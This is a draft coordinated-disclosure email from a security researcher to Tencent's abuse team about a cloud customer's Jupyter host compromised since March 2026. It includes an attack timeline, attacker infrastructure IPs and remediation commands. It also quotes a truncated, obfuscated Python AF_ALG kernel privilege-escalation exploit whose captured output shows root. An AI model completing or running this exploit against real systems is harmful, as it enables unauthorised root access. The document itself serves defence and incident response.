---
to: abuse@tencent.com
cc: abuse@nuclide-research.com
severity: CRITICAL
ip: 101.34.81.166
institution: Tencent Cloud Beijing — customer Jupyter Notebook compromised since March 2026; 50+ days of attacker artifacts including AF_ALG kernel root exploit (uid=0 confirmed) and likely-same Hilix botnet payload as Ulm Cortical Labs incident
status: DRAFT
date: 2026-05-06
---

**To:** abuse@tencent.com
**Cc:** abuse@nuclide-research.com
**Subject:** Tencent customer host 101.34.81.166 compromised since March 2026 — unauth Jupyter Notebook on port 8888; AF_ALG kernel root exploit confirmed; cross-references the active Hilix botnet campaign documented at Universität Ulm

---

Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com

2026-05-06

**Re:** Active long-running compromise on Tencent customer host
**IP:** 101.34.81.166 (Tencent Cloud Beijing, AS TENCENT-CN)
**Severity:** CRITICAL — 50+ days of attacker artifacts; confirmed root via kernel exploit

---

I'm an independent security researcher conducting good-faith AI infrastructure research under the NuClide Research umbrella (CISA disclosures CVE-2025-4364, ICSA-25-140-11). This is an unsolicited coordinated-disclosure notification for a long-running compromise on a Tencent Cloud customer host.

The host `101.34.81.166` runs an unauthenticated Jupyter Notebook on port 8888. The legitimate operator appears to be a Chinese developer running a personal LLM-agent workspace (the workspace contains an "OpenClaw"-class agent framework: `AGENTS.md`, `SOUL.md`, `IDENTITY.md`, `USER.md`, `MEMORY.md`, `HEARTBEAT.md`, plus `memory/`, `state/`, `skills/`, `docs/` directories — this is a benign personal AI-agent setup).

However, the same Jupyter Notebook directory contains **attacker artifacts dating back to 2026-03-17**. The unauthenticated Jupyter has been used by external attackers as a persistent foothold for ~50 days. The most recent attacker-touched file (`untitled.txt`) was modified **today (2026-05-06 06:09 UTC)**.

## Compromise timeline

Attacker artifacts in `/home/<user>/` (the Jupyter notebook root), chronological:

| Date | Artifact | Type |
|---|---|---|
| 2026-03-17 | `main` | binary (likely first payload) |
| 2026-03-24 | `_recon.py` + `_recon.ipynb` | reconnaissance script (whoami, uname, nvidia-smi, /proc/meminfo, /etc/passwd enumeration) |
| 2026-03-31 | `2.js` | JavaScript payload |
| 2026-03-31 | `proxy.txt` | proxy list (botnet infrastructure) |
| 2026-04-05 | `vcimanagement.x64` | Windows-style binary name (cross-platform attacker tool?) |
| 2026-04-05 | `Untitled2.ipynb` | attacker working notebook |
| 2026-04-27 | `Untitled1.ipynb` | attacker working notebook |
| 2026-04-28 | **`x86_64`** | **likely Hilix botnet payload — same filename pattern as the campaign documented at Ulm Cortical Labs (134.60.110.66) the same week** |
| 2026-04-29 | `Untitled.ipynb` + `Untitled3.ipynb` | attacker working notebooks |
| 2026-05-04 | `Untitled4.ipynb` + `Untitled5.ipynb` + **`Untitled6.ipynb`** | three attacker notebooks; `Untitled6` contains the AF_ALG kernel root exploit |
| 2026-05-06 06:09 UTC | **`untitled.txt`** | **most-recent attacker touch — TODAY** |

## Confirmed root achieved via AF_ALG kernel exploit

`Untitled6.ipynb` (2026-05-04) contains a Python obfuscated kernel-exploit attempt:

```python
import os as g, zlib, socket as s
def d(x): return bytes.fromhex(x)
def c(f, t, c):
    a = s.socket(38, 5, 0)               # AF_ALG (38), SOCK_SEQPACKET (5)
    try:
        a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        h = 279                          # SOL_ALG (279)
        v = a.setsockopt
        v(h, 1, d('0800010000000010' + '0'*64))
        v(h, 5, None, 4)
        u, _ = a.accept()
        ...
        u.sendmsg([b"A"*4 + c],
                  [(h, 3, i*4), (h, 2, b'\x10' + i*19), (h, 4, b'\x08' + i*3)],
                  32768)
        n = g.splice
        n(f, w, o, offset_src=0)
        ...
```

Cell output: `uid=0(root) gid=0(root) groups=0(root)`

**This is an AF_ALG kernel-crypto exploit** (the `socket(38, 5, 0)` is `AF_ALG` socket family, `setsockopt(279, ...)` is `SOL_ALG`). Likely a CVE-2017-13166-class or follow-on AF_ALG sendmsg/splice vulnerability. The exploit succeeded — the cell output captured **uid=0(root)** confirming kernel-level privilege escalation from the unauthenticated Jupyter context.

## Cross-reference: same Jupyter-targeted botnet campaign as Ulm

NuClide simultaneously discovered an **active compromise on `134.60.110.66` (`labdevice.medizin.uni-ulm.de`)** today — a Cortical Labs CL1 biological-computing device at Universität Ulm Medical Faculty's research lab. Both compromises share:

- **Same compromise vector:** unauthenticated Jupyter Notebook on port 8888
- **Same Hilix.x86_64 payload filename** (Mirai-derivative IoT botnet)
- **Same April-2026 campaign window** (Ulm: 2026-04-29; Tencent: 2026-04-28)

The two attackers may be:
- **The same Hilix botnet operator** (same payload, same filename, same week)
- Or two operators using the same publicly-available Hilix payload

The Tencent host's attacker did MORE than just botnet recruitment — they pivoted to AF_ALG kernel exploitation for full root privilege. This suggests either:
- A more sophisticated branch of the Hilix campaign
- Or a different actor who landed via Hilix and escalated for more thorough exploitation

A parallel disclosure was sent today to:
- `it-sicherheit@uni-ulm.de` + DFN-CERT for the Ulm victim-side incident response
- `abuse@akamai.com` + `abuse@linode.com` for the C2 endpoint at `172.233.96.208:3053` (Linode US — receiving reverse shells from compromised victims)
- `abuse@cogentco.com` for the malware-distribution host at `38.87.117.84` (`velonodes.in`, which served the Hilix.x86_64 payload)

Tencent's customer is the third confirmed victim in this campaign.

## Operator profile (legitimate)

The legit operator runs a personal Chinese AI/LLM-agent workspace on this droplet. Visible in the workspace:

```
AGENTS.md       — agent boot instructions ("Read SOUL.md, USER.md, memory/YYYY-MM-DD.md...")
SOUL.md         — agent personality / values
IDENTITY.md     — agent name + vibe (template, mostly unfilled)
USER.md         — the human's profile
MEMORY.md       — long-term memory
BOOTSTRAP.md    — first-run instructions ("birth certificate")
TOOLS.md        — tool inventory
HEARTBEAT.md    — agent heartbeat tracking
memory/         — daily logs (YYYY-MM-DD.md)
state/          — agent state
skills/         — skill library
docs/           — operator docs
monitor_jupyter.sh — Chinese-comment script that auto-restarts Jupyter if down
```

This is benign infrastructure — a developer building a personal LLM-agent runtime. **No malicious operator activity.** The compromise is purely from external attackers exploiting the unauth Jupyter.

The `monitor_jupyter.sh` script is double-edged: it keeps Jupyter alive for the operator's legitimate work BUT also keeps the unauth attack surface alive. Until the operator adds Jupyter auth, every restart re-exposes the host.

## Required action (for the customer)

1. **Stop the Jupyter Notebook service immediately** on `101.34.81.166`:
   ```bash
   sudo systemctl stop jupyter
   sudo systemctl disable jupyter   # OR remove the monitor_jupyter.sh auto-restart
   ```

2. **Audit the host and quarantine the attacker artifacts:**
   ```bash
   # In the Jupyter notebook root (likely /root/ or /home/<user>/):
   ls -la _recon.py _recon.ipynb Untitled*.ipynb x86_64 vcimanagement.x64 main 2.js proxy.txt untitled.txt
   # Move to a forensic-preservation directory before deleting:
   mkdir -p /forensic/2026-05-06
   mv _recon.* Untitled*.ipynb x86_64 vcimanagement.x64 main 2.js proxy.txt /forensic/2026-05-06/
   ```

3. **Audit for kernel-level persistence (AF_ALG exploit may have escalated to root and dropped persistence):**
   ```bash
   crontab -l; sudo crontab -l
   ls -la /etc/cron.d/
   systemctl list-units --type=service --state=running | grep -vE 'systemd|getty|sshd|udev'
   ls -la /root/.ssh/authorized_keys ~labuser/.ssh/authorized_keys ~/.ssh/authorized_keys 2>/dev/null
   find /tmp /var/tmp /dev/shm /usr/local/bin /opt -type f -mtime -60 -ls
   # Check for kernel module persistence:
   lsmod | head -30
   ```

4. **Re-deploy Jupyter with token authentication** before bringing it back up:
   ```bash
   jupyter notebook password
   # Or in config: c.NotebookApp.token = '<random>'
   # AND restrict to localhost: c.NotebookApp.ip = '127.0.0.1'
   ```

5. **Given root was achieved via kernel exploit, full reinstall recommended.** The attacker may have installed kernel rootkits not visible to userspace tools. Snapshot the disk for forensics, then reimage.

6. **The OpenClaw-class agent framework files** (`AGENTS.md`, `SOUL.md`, `MEMORY.md`, `memory/`, `state/`, `skills/`) are the legitimate operator's work — preserve those before reimaging.

## Reference

Sister Ulm Cortical Labs incident (full case study and forensic detail on the same Hilix campaign):
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/commercial/multi-uni-ulm-jupyter-compromise-2026-05-06.md

Tencent host case study:
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT (case study committed today)

Verification was non-destructive: only `GET /api/contents/` listings + a small number of file-content reads (the AGENTS.md / SOUL.md / IDENTITY.md / Untitled6.ipynb that confirm operator vs attacker artifact origin). No kernel interaction, no exploitation steps taken against this host.

I am available for verification or additional forensic detail. Given the active campaign and confirmed root, expedited customer notification is requested.

Regards,
Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT
